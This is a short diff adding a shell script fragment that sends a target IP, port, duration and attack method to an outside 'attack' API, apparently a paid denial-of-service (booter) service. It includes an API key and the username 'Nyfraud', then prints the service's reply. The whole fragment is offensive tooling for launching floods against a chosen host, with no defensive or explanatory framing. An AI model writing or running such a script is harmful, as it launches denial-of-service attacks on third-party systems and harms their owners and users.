@@ -1,0 +1,6 @@
+
+echo time $port
+cmd=$(curl "https://api.blaze-api.cc/attack?key=4hgj3tccd1g1207&username=Nyfraud&host=$ip&port=$port&time=$time&method=$method" )
+
+echo sending...
+echo $cmd
